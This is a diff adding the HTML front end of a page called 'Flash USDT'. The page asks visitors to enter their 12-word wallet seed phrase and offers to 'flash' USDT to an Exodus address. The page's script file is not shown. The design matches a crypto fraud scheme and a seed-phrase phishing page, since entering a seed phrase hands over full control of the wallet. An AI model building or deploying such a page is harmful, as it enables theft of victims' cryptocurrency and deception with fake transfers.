@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flash USDT</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bip39@3.1.0/browser/bip39.min.js"></script>
+    <style>
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        @keyframes slideIn {
+            from { transform: translateX(-20px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        @keyframes rotate {
+            0% { transform: translate(-50%, -50%) rotate(0deg) scale(0.95); }
+            50% { transform: translate(-50%, -50%) rotate(180deg) scale(1.05); }
+            100% { transform: translate(-50%, -50%) rotate(360deg) scale(0.95); }
+        }
+        @keyframes rotateReverse {
+            0% { transform: translate(-50%, -50%) rotate(360deg) scale(1.05); }
+            50% { transform: translate(-50%, -50%) rotate(180deg) scale(0.95); }
+            100% { transform: translate(-50%, -50%) rotate(0deg) scale(1.05); }
+        }
+        @keyframes glow {
+            0% { box-shadow: 0 0 50px rgba(255, 255, 255, 0.1); }
+            50% { box-shadow: 0 0 100px rgba(255, 255, 255, 0.2); }
+            100% { box-shadow: 0 0 50px rgba(255, 255, 255, 0.1); }
+        }
+        .animate-fade-in {
+            animation: fadeIn 0.5s ease-out;
+        }
+        .animate-pulse-slow {
+            animation: pulse 2s infinite;
+        }
+        .animate-slide-in {
+            animation: slideIn 0.3s ease-out;
+        }
+        .hover-scale {
+            transition: transform 0.2s ease;
+        }
+        .hover-scale:hover {
+            transform: scale(1.02);
+        }
+        .glass-effect {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .rotating-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            pointer-events: none;
+            z-index: -1;
+            background: radial-gradient(circle at center, rgba(40, 40, 40, 0.3) 0%, rgba(0, 0, 0, 0.5) 70%);
+            overflow: hidden;
+        }
+        .rotating-circle {
+            position: absolute;
+            border-radius: 50%;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            border: 2px solid rgba(255, 255, 255, 0.15);
+            box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
+            animation-timing-function: ease-in-out;
+        }
+        .circle-1 {
+            width: 150vmax;
+            height: 150vmax;
+            animation: rotate 30s infinite, glow 4s infinite;
+            border-color: rgba(255, 255, 255, 0.2);
+        }
+        .circle-2 {
+            width: 120vmax;
+            height: 120vmax;
+            animation: rotateReverse 25s infinite, glow 6s infinite;
+            border-color: rgba(255, 255, 255, 0.15);
+        }
+        .circle-3 {
+            width: 90vmax;
+            height: 90vmax;
+            animation: rotate 20s infinite, glow 8s infinite;
+            border-color: rgba(255, 255, 255, 0.1);
+        }
+        .content-wrapper {
+            position: relative;
+            z-index: 1;
+        }
+        .circle-1::after,
+        .circle-2::after,
+        .circle-3::after {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1));
+            z-index: -1;
+        }
+    </style>
+</head>
+<body class="bg-black text-white min-h-screen overflow-x-hidden">
+    <!-- Rotating Background -->
+    <div class="rotating-bg">
+        <div class="rotating-circle circle-1"></div>
+        <div class="rotating-circle circle-2"></div>
+        <div class="rotating-circle circle-3"></div>
+    </div>
+
+    <!-- Content -->
+    <div class="content-wrapper">
+        <div class="max-w-2xl mx-auto p-8 pt-12">
+            <!-- Wallet Connection -->
+            <div class="bg-zinc-900 p-6 rounded-lg shadow-2xl mb-8 hover-scale glass-effect animate-fade-in">
+                <h2 class="text-xl font-semibold mb-4 text-white">Connect Wallet</h2>
+                <div class="mb-4">
+                    <label for="seedPhrase" class="block text-gray-300 mb-2">Enter your seed phrase:</label>
+                    <input type="text" id="seedPhrase" class="w-full p-3 bg-black border border-gray-700 rounded text-white placeholder-gray-500 focus:outline-none focus:border-white transition-colors" placeholder="Enter your 12-word seed phrase">
+                </div>
+                <div>
+                    <button id="connectWithSeed" class="w-full bg-white text-black px-6 py-3 rounded hover:bg-gray-200 transition-colors animate-pulse-slow">Connect with Seed Phrase</button>
+                </div>
+                <div class="mt-4">
+                    <p id="walletAddress" class="text-gray-400"></p>
+                    <p id="walletBalance" class="text-gray-400"></p>
+                </div>
+            </div>
+
+            <!-- Flash Form -->
+            <div class="bg-zinc-900 p-6 rounded-lg shadow-2xl hover-scale glass-effect animate-fade-in" style="animation-delay: 0.2s">
+                <h2 class="text-xl font-semibold mb-4 text-white">Flash USDT</h2>
+                <form id="transferForm">
+                    <div class="mb-4">
+                        <label for="recipient" class="block text-gray-300 mb-2">Exodus Wallet Address:</label>
+                        <input type="text" id="recipient" class="w-full p-3 bg-black border border-gray-700 rounded text-white placeholder-gray-500 focus:outline-none focus:border-white transition-colors" placeholder="Enter Exodus wallet address" required>
+                    </div>
+                    <div class="mb-4">
+                        <label for="amount" class="block text-gray-300 mb-2">Amount (USDT):</label>
+                        <input type="number" id="amount" class="w-full p-3 bg-black border border-gray-700 rounded text-white placeholder-gray-500 focus:outline-none focus:border-white transition-colors" placeholder="Enter amount in USDT" required>
+                    </div>
+                    <button type="submit" class="w-full bg-white text-black px-6 py-3 rounded hover:bg-gray-200 transition-colors font-bold animate-pulse-slow">Flash</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Wait for all libraries to load
+        window.addEventListener('load', function() {
+            if (typeof ethers === 'undefined') {
+                console.error('ethers not loaded');
+                alert('Error: Required libraries not loaded. Please refresh the page.');
+            }
+        });
+    </script>
+    <script src="js/app.js"></script>
+</body>
+</html> 
